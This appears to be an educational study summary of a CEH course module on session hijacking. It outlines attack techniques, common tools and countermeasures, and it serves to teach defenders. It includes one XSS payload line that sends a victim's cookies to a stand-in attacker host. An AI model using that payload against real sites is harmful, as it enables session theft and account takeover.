
CEH v13 – Module 11: Session Hijacking (GitHub Summary)
📌 Overview

Session hijacking is the process of taking over a valid user session to gain unauthorized access to web applications, network services, or systems. Attackers exploit weak session IDs, insecure cookies, or network-level vulnerabilities to impersonate users.

🎯 Learning Objectives

Understand session management and authentication concepts

Identify weaknesses in session IDs and token generation

Learn session hijacking attack techniques

Explore network-level and application-level hijacking

Apply detection, prevention, and mitigation strategies

🔥 Attack Techniques
1. Session Sniffing

Capturing session IDs using:

Wireshark

tcpdump

Ettercap

MITM attacks

2. Session Prediction

Guessing weak or sequential session tokens.

3. Session Sidejacking

Using stolen cookies from HTTP/HTTPS misconfigurations.

4. Cross-site Scripting (XSS)

Injecting JavaScript to steal cookie/session tokens:

document.location='http://attacker.com/steal?cookie='+document.cookie;

5. Cross-site Request Forgery (CSRF)

Forcing a victim to perform unintended actions using authenticated cookies.

6. Man-in-the-Middle Attacks

ARP poisoning, DNS spoofing, or rogue APs to intercept session traffic.

7. Session Fixation

Forcing the user to use a pre-defined session ID.

🧰 Common Tools Used
Category	Tools
Sniffing	Wireshark, Ettercap, tcpdump
MITM	Bettercap, MITMf
Web Exploitation	Burp Suite, OWASP ZAP
Cookie Attacks	Cookie Editor, FireSheep
Automation	Metasploit modules
🛡️ Countermeasures
Network-Level

Use HTTPS/TLS for all sessions

Implement VPN & encrypted communication

Use secure cookies (Secure, HttpOnly, SameSite)

Application-Level

Regenerate session IDs after login

Strong random session tokens

Implement timeout + re-authentication

Enable MFA

Filter/block malicious input (prevent XSS)

Detection

Monitor abnormal session behavior

IP/UA mismatch alerts

High session reuse

Suspicious cookie changes
